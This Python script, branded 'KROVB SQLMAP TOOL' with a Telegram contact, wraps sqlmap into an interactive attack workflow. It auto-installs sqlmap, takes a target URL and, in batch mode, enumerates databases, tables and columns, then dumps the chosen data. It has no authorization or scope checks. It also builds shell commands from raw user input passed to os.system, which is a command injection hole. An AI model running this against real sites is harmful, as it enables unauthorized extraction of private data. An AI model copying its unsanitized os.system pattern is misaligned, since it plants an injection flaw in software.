import os
import shutil
S = '\033[93m'
B = '\033[37m'
G = '\033[1;30;40m'
def Am():
    if shutil.which("sqlmap") is None:
        print(G+"sqlmap is not installed, its installing..."+B)
        os.system("pip install sqlmap")
        os.system('clear')
    else:
        print(S+"sqlmap installed"+B)
        os.system('clear')
Am()
''' 


Tg: @Zalimlestim




   '''
def uygulaSqlmap(komut):
    os.system(komut)
def godless():
    print('''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠶⠶⣶⣶⠶⠶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠲⠶⣶⣿⣿⣶⡶⠒⠲⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⣿⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⡄⠛⠛⠛⠛⠛⠛⢢⡔⠛⠛⠛⠛⠛⠛⠻⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠓⢠⠘⠛⠛⠛⠛⠻⠓⠠⠘⠛⠛⠛⠛⠛⠓⣤
⢸⡇⠀⠀⠀⠀⠰⠶⢸⡇⠀⠀⢠⡄⠀⠀⠀⣹⣿⣽⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠀⠀⠀⠀⠀⠀⠀⡤⡀⠀⠀⣿
⢸⡇⠛⠛⠂⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠨⣿⡿⣿⣍⡅⠀⠀⠠⡄⠀⠀⠀⠄⠀⠀⢰⠇⠀⠀⠈⠀⠀⠀⠰⠀⠀⠀⠀⠀⠀⠀⣿
⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣼⣯⣽⣸⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⡄⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠈⠃⠛⠛⠛⠛⠛⠛⠛⠋⠛⠛⢠⡄⠀⠀⢨⣽⢿⣿⠉⠙⠛⠛⠙⠛⠛⠛⠐⠙⠛⠛⠘⠙⠛⠛⠛⠛⠉⠀⠐⠀⠀⠀⠀⠘⠛⠛⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢸⡇⢏⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠋⠙⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠐⠀⠀⠀⠀''')        
    print(G+"\t\t\tKROVB SQLMAP TOOL")    
    url = input(S+"Enter URL: "+B)    
    databaseKomut = f"sqlmap -u \"{url}\" --batch --dbs"
    uygulaSqlmap(databaseKomut)    
    dbIsmi = input(S+"Enter Database Name (Press 'x' if the database could not be found.) : "+B)
    if dbIsmi.lower() == 'x':
        print(S+"Tool closed.."+B)
        return    
    tabloKomut = f"sqlmap -u \"{url}\" --batch -D \"{dbIsmi}\" --tables"
    uygulaSqlmap(tabloKomut)
    
    tabloIsmi = input(S+"Enter table name: "+B)   
    kolonKomut = f"sqlmap -u \"{url}\" --batch -D \"{dbIsmi}\" -T \"{tabloIsmi}\" --columns"
    uygulaSqlmap(kolonKomut)    
    kolonIsmi = input(S+"Enter Column: "+B)    
    komutData = f"sqlmap -u \"{url}\" --batch -D \"{dbIsmi}\" -T \"{tabloIsmi}\" -C \"{kolonIsmi}\" --dump"
    uygulaSqlmap(komutData)
if __name__ == "__main__":
    godless()